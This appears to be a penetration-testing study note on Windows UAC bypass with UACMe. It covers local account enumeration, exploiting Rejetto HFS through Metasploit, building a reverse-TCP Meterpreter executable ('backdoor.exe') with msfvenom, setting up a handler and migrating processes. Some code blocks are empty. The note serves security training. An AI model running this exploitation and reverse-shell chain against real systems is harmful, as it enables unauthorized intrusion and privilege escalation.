# Windows UAC Bypass With UACMe

## Overview

User Account Control (UAC) is a Windows security feature designed to prevent unauthorized changes to the operating system.

When a user or application attempts to perform an administrative action, Windows can display a UAC prompt requesting approval or administrator credentials.

In a penetration-testing lab, UAC bypass techniques can be studied to understand how an attacker with administrative-group access but without a fully elevated process may attempt to obtain a high-integrity process.

This note covers the initial reconnaissance, obtaining a Meterpreter session, identifying the current user and privileges, understanding UAC configuration, and introducing UACMe for studying UAC bypass techniques.

> All examples in this note should be performed only against systems that you own or are explicitly authorized to test.

---

## User Account Control

UAC was introduced in Windows Vista to help prevent unauthorized changes to the operating system.

UAC separates normal user activity from administrative operations by using different integrity levels and elevation prompts.

A non-administrative user normally receives a credential prompt when an administrative operation is requested.

A user who is already a member of the local Administrators group may receive a consent prompt instead.

The important distinction is that being a member of the Administrators group does not necessarily mean that every process is already running with full administrative privileges.

---

## UAC Security Levels

Windows provides several UAC notification levels.

The default configuration generally allows Windows to notify the user when applications attempt to make changes while not prompting for changes initiated by the user through Windows settings.

The UAC setting can be viewed from:

```text
Control Panel
    -> User Account Control
    -> Change User Account Control settings
```

The security level can be adjusted using the UAC slider.

In a security-testing lab, changing this setting can help demonstrate how different UAC configurations affect privilege elevation.

---

## Understanding UAC Bypass

A UAC bypass does not normally mean obtaining administrator credentials.

Instead, the objective is to abuse a trusted Windows component or configuration that can cause a process to execute with elevated privileges without displaying the expected UAC consent prompt.

A typical lab scenario looks like:

```text
Initial Access
      |
      v
Low/Medium Integrity Process
      |
      v
User is Member of Administrators
      |
      v
UAC Restriction
      |
      v
UAC Bypass Technique
      |
      v
High Integrity Process
```

The exact technique depends on the Windows version, build, configuration, and available vulnerable or auto-elevated components.

---

## Requirements for Studying UAC Bypass

A common UAC bypass lab requires access to an account that belongs to the local Administrators group.

The account may still be running normal applications without a fully elevated administrative token.

For example, the following command can be used to enumerate local users:

```cmd
net user
```

Example output:

```text
User accounts for \\VICTIM

-------------------------------------------------
admin          Administrator          Guest

The command completed successfully.
```

The local Administrators group can then be examined with:

```cmd
net localgroup administrators
```

Example:

```text
Alias name     administrators

Members

-------------------------------------------------
admin
Administrator

The command completed successfully.
```

This confirms that `admin` is a member of the local Administrators group.

---

## Why Administrator Group Membership Matters

A user being present in the local Administrators group does not necessarily mean that the current process has unrestricted administrative privileges.

Windows can provide the user with a filtered token for normal activity while requiring elevation for administrative operations.

This is why UAC is important during post-exploitation.

For example:

```text
User: admin
Group: Administrators
Current Process: Medium Integrity
```

The user has administrative capability, but the current process may not yet have a fully elevated token.

## Setting Up Metasploit

Metasploit can be started after identifying a suitable service or vulnerability in the authorized lab environment.

```bash
service postgresql start
msfconsole
```

Once Metasploit starts, the target can be configured:

```text
msf6 > setg RHOSTS 10.2.22.220
RHOSTS => 10.2.22.220
```

Searching for available modules can then be performed with:

```text
msf6 > search rejetto
```

The example identifies:

```text
exploit/windows/http/rejetto_hfs_exec
```

The module targets Rejetto HTTP File Server and can provide an initial Meterpreter session when the target is vulnerable and the lab conditions are appropriate.

## Session Management

Once a Meterpreter session is established, session management becomes important.

Metasploit can maintain multiple sessions simultaneously.

Useful commands include:

```text

```

To interact with a specific session:

```text

```

The Metasploit console may also provide a shortcut such as:

```text

```

This interacts with the most recently opened session.

A typical workflow is:

```text

 |

 |
 +-- Meterpreter Session 1

 +-- Background Session
 |
```

## Testing Administrative Access

The example attempts to modify the `admin` account:

```cmd
net user admin password123
```

The command returns:

```text
System error 5 has occurred.

Access is denied.
```

This is an important observation.

The account is a member of the Administrators group, but the current process does not have the required elevated administrative context for the requested operation.

This demonstrates why UAC can be relevant during post-exploitation.

## UAC Bypass With UACMe

UACMe is an open-source project designed to demonstrate techniques that abuse Windows auto-elevated functionality to bypass UAC.

The project contains multiple techniques targeting different Windows versions and configurations.

Repository:

```text
https://github.com/hfiref0x/UACME
```

UACMe documentation provides information about the supported Windows versions, methods, requirements, and implementation details.

---

## UACMe Requirements

The lab example shows UACMe being used against Windows systems where:

```text
Windows 7 / 8 / 8.1 / 10
```

and appropriate administrative-group membership are relevant to the available techniques.

Compatibility depends on the specific UACMe method and Windows build.

This is important because a UAC bypass technique that works on one Windows build may not work on another.

## UACMe Usage Concept

UACMe provides executable implementations of different UAC bypass techniques.

The general concept is:

```text

        |
        v
UACMe Technique
        |
        v
Trusted / Auto-Elevated Windows Component
        |
        v
Elevated Process
```

The exact implementation varies between UACMe methods.

The project documentation identifies the Windows versions, affected components, implementation details, and whether a particular method has been fixed.

## Creating a Lab Meterpreter Payload

Another way to establish the session in a controlled lab is to generate a standalone Windows Meterpreter executable with `msfvenom`.

The generated executable should be treated as a controlled lab artifact and should not be used against systems without authorization.

Example:

```
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.5.2 \
LPORT=1234 \
-f exe \
-o backdoor.exe
```

The important parameters are:

```
-p       Payload to generate
LHOST    IP address of the lab listener
LPORT    Port used by the listener
-f exe   Generate a Windows executable
-o       Output filename
```

The result is:

```
backdoor.exe
```

Verify that the file was created:

```
ls -lh backdoor.exe
```

Example:

```
-rwxr-xr-x 1 root root 72K backdoor.exe
```

The payload itself does not automatically provide a session. A compatible Metasploit handler must be listening for the reverse connection.

## Starting the Handler

The `multi/handler` module can be used to receive a reverse Meterpreter connection.

```text
msf6 > use multi/handler
```

Set the payload:

```text
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

Set the listener IP:

```text
msf6 exploit(multi/handler) > set LHOST 10.10.5.2
```

Set the listening port:

```text
msf6 exploit(multi/handler) > set LPORT 1234
```

Start the handler:

```text
msf6 exploit(multi/handler) > run
```

The handler starts listening:

```text
[*] Started reverse TCP handler on 10.10.5.2:1234
```

When the corresponding lab payload connects back:

```text
[*] Sending stage (175174 bytes) to 10.2.22.220
[*] Meterpreter session 1 opened
```

The session can then be accessed through:

```text
meterpreter >
```

## Process Migration

Meterpreter can migrate its session into another running process using its PID.

For example:

```text
meterpreter > migrate 688
```

Output:

```text
[*] Migrating from 2396 to 688...
[*] Migration completed successfully.
```

After migration, the Meterpreter session operates through the selected process.

The process list can be used to identify suitable processes:

```text
meterpreter > ps
```

Process migration should be performed carefully because migrating into an incompatible or protected process can cause the session to become unstable or terminate.

## Verifying the Security Context

After any UAC-related test, verify whether the process actually obtained the expected security context.

Useful checks include:

```
meterpreter > getuid
meterpreter > getprivs
meterpreter > sysinfo
```

From a Windows shell:

```
whoami
```

The objective is to compare the state before and after the test:

```
Before
    |
    +-- Administrator Group Member
    +-- Medium Integrity
    +-- Limited Token
    |
    v
UAC Test
    |
    v
After
    |
    +-- Same User
    +-- Elevated Process
    +-- Higher Integrity Context
```

The important point is that successful UAC bypass testing should be demonstrated through observable changes in the process security context rather than simply assuming that elevation occurred.

# Key Concepts

The lab demonstrates several important concepts:

- UAC protects Windows against unauthorized elevation.
- Administrator group membership does not necessarily mean that the current process is fully elevated.
- `getuid` identifies the account associated with the Meterpreter session.
- `getprivs` identifies privileges available to the current process.
- `sysinfo` identifies the target operating system and architecture.
- `net user` enumerates local accounts.
- `net localgroup administrators` identifies members of the local Administrators group.
- `ps` provides process information.
- Process migration can change the architecture and context of a Meterpreter session.
- An `Access is denied` response can indicate that the current process lacks the required elevated security context.
- UAC bypass techniques depend heavily on the Windows version, build, architecture, and configuration.
- UACMe provides techniques for researching Windows UAC behavior.
- A generated Meterpreter executable and its handler must use compatible payload, IP, and port settings.
- Reverse-connection payloads should be used only in controlled environments.
